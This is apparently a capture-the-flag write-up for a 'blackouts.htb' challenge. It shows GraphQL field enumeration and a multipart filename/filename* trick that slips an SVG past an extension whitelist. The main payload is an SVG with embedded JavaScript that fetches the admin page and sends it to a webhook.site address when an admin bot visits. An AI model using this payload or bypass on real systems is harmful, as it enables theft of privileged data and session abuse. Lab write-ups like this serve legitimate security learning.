

 Enumerate the Verification Code via GraphQL
Inspecting the GraphQL schema in


```
type User {
id: ID!
email: String!
role: String!
inviteCode: String # <-- the verification token
verified: Boolean!
}
```


The inviteCode field holds our verification code. We can craft a simple GraphQL query to fetch it:

```
POST /graphql HTTP/1.1
Host: blackouts.htb
Content-Type: application/json
{"query":"query {\r\n me {\r\n inviteCode\r\n }\r\n}"}
```

Analyze the Incident‑Report and Upload Paths


Navigating the source, two relevant routes stand out:

 - Submitting an incident report ( submitIncidentReport resolver)
- Validates evidenceUrl starts with http:// or https://
- Inserts the report and then asynchronously calls a corporate bot to visit our URL using admin
credentials.
- File upload endpoint ( POST /upload in routes/pages.js )
- Uses Busboy and OpenResty to parse multipart files.
- Naïvely trusts the file extension in the Content-Disposition header to whitelist only .jpg ,
.jpeg , and .png .


### the Admin Bot (The Trigger)

The server had a hidden feature: Whenever a user submits an incident report with a URL, a **secret Admin Bot** (a headless Chrome browser) automatically visits that URL to "check the evidence."

You submitted a report and told the bot to visit your malicious `attack.svg` file.


After uploading, the filename is recorded in the database, but there's no additional server‑side validation of
the file contents.

4. Bypass Multipart Validation and Upload a Malicious SVG


Researching Busboy and OpenResty multipart parsing, we discover a quirk: by adding both a normal
filename and an extended filename* parameter, the server’s Lua validator can be tricked. For example:


```
Content-Disposition: form-data; name="file";
filename="image.png";
filename*=UTF-8''attack.svg
```


his passes the extension check (seeing .png ) while the actual file is saved as an SVG.
We craft an SVG payload that executes JavaScript when opened:


```
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
<script type="text/javascript">
// Fetch the admin dashboard and exfiltrate via webhook
fetch('/admin')
.then(res => res.text())
.then(html =>
fetch('https://webhook.site/your-unique-id', {
method: 'POST',
body: btoa(html)
})
);
</script>
</svg
```

Upload this SVG using the multipart header trick.

Finally, we submit an incident report that points to our uploaded SVG’s URL and get the flag


### The Steal (The Payload)

When the Admin Bot visited your SVG file, the browser ran the JavaScript hidden inside it. Because the file was hosted _on the server itself_, the JavaScript had permission to ask the server for other pages.

The JavaScript essentially said: _"Hey server, give me the `/admin` page."_  
The server saw the Admin Bot's session cookie, said "Yes sir!", and sent back the HTML of the admin dashboard.

Your JavaScript immediately grabbed that HTML and shipped it to your `webhook.site` link.
